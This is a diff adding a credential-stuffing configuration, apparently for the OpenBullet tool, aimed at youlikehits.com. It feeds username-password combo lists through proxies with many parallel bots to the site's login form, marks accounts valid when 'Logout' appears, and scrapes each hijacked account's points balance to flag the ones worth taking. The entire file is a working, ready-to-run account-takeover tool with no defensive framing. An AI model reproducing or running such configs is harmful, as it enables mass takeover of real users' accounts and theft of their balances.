@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "YouLikeHits",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-02T06:10:25.2334332-07:00",
+  "AdditionalInfo": "",
+  "Author": "StarNulled",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.youlikehits.com/login.php?step=login" 
+  CONTENT "username=<USER>&pass=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.youlikehits.com" 
+  HEADER "Origin: https://www.youlikehits.com" 
+  HEADER "Referer: https://www.youlikehits.com/login.php" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+#Valid_Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+  KEYCHAIN Failure OR 
+    KEY "We couldn't find an account matching the username and password you entered." 
+
+#Points_Capture PARSE "<SOURCE>" LR "=\"currentpoints\" style=\"color:#fff;font-size:15px;\">" "</span>&nbsp;&nbsp;&nbsp;<a href=\"buypoints.php\"" -> CAP "Points" 
+
+#Points_Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<Points>" Contains "0" 
+    KEY "<Points>" Contains "-" 
+  KEYCHAIN Success AND 
+    KEY "<Points>" DoesNotContain "0" 
+    KEY "<Points>" DoesNotContain "-" 
+
